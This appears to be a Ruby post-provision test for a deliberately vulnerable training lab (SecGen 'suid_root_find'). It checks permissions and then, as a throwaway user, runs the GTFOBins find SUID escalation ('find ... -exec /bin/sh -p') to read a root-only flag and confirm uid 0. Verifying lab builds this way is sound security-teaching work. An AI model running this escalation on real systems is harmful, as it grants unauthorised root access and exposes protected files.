require_relative '../../../../../lib/post_provision_test'

class SuidRootFindTest < PostProvisionTest
  def initialize
    self.module_name = 'suid_root_find'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # read_facts: leaked_filenames and strings_to_leak. Both are checked below
  # through json_inputs (file name in /root, and its content via the exploit).
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      # the real binary (symlinks resolved), root-owned with the SUID bit
      test_local_command('find resolves to a root-owned SUID file',
                         "stat -L -c '%a %U' $(command -v find)", '4755 root')
      leaked.each do |f|
        test_local_command("#{f} root-only in /root",
                           "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      user = 'nobody'
      # what a student sees when enumerating SUID binaries
      test_local_command('find is listed among SUID binaries for an unprivileged user',
                         'find / -perm -4000 -type f 2>/dev/null', '/usr/bin/find', user: user)
      # control: the flag is really unreadable without the escalation
      leaked.each do |f|
        test_local_command("control: unprivileged user cannot read #{f}",
                           "cat #{Shellwords.escape("/root/#{f}")} 2>&1", 'Permission denied', user: user)
      end
      # the misconfiguration: find -exec runs the command with the effective uid of root
      test_local_command('unprivileged user runs a command as root via find',
                         "find /etc/hostname -exec id -u \\; -quit", '0', user: user)
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_local_command("unprivileged user reads leaked #{fname} via find",
                           "find /etc/hostname -exec cat #{Shellwords.escape("/root/#{fname}")} \\; -quit",
                           s.strip.lines.first.to_s.strip, user: user)
      end
    end

    # Tier 3 (exploit): GTFOBins "find" SUID privilege escalation, proven as a
    # disposable unprivileged account. find is SUID root, so its -exec runs a
    # child with effective uid 0; /bin/sh -p keeps that euid instead of dropping
    # it. The escalated shell reads /root's 0600 flag that the same account
    # cannot read directly (the tier-2 control). <privilege> is root_rwx, so we
    # assert the escalated shell is root (uid/euid 0) as well as reading the flag.
    # The exploit only reads (no file is written on the target, nothing to undo);
    # with_throwaway_ssh_user removes the account on the way out.
    tier(3) do
      flag_paths = leaked.map { |f| "/root/#{f}" }
      needles = strings.map { |s| s.strip.lines.first.to_s.strip }.reject(&:empty?)
      if flag_paths.empty? || needles.empty?
        skip_check('find SUID privilege escalation',
                   'no leaked flag file/string available to prove the escalation against', tier: 3)
      else
        marker_b = 'SECGEN_T3_FLAG_BEGIN'
        marker_e = 'SECGEN_T3_FLAG_END'
        # -exec /bin/sh -p (GTFOBins: find, SUID): a privilege-preserving shell
        # that cats the root-only flag(s) and prints id as proof of the euid.
        exploit = "find /etc/hostname -exec /bin/sh -p " \
                  "-c 'id; echo #{marker_b}; cat #{flag_paths.join(' ')}; echo #{marker_e}' ';' -quit"
        with_throwaway_ssh_user do |user, _pass|
          out = run_as_user(user, exploit)[:stdout].to_s
          add_evidence('t3_find_suid_exploit', "echo #{Shellwords.escape(out)}")
          flag_region = out[/#{marker_b}(.*?)#{marker_e}/m, 1].to_s
          # 'uid=0(root)' is a substring of both uid=0(root) and euid=0(root)
          got_root  = out.include?('uid=0(root)')
          flag_read = needles.all? { |n| flag_region.include?(n) }
          name = 'find SUID privilege escalation reads the root-only flag as root'
          if got_root && flag_read
            pass_check(name,
                       "throwaway user #{user} escalated via find SUID (/bin/sh -p): #{out[/e?uid=0\(root\)/]} and read the root-only flag", tier: 3)
          else
            fail_check(name,
                       "find SUID escalation as #{user}: root_shell=#{got_root}, flag_read=#{flag_read}; output: #{out[0, 300].inspect}", tier: 3)
          end
        end
      end
    end
  end

end

SuidRootFindTest.new.run
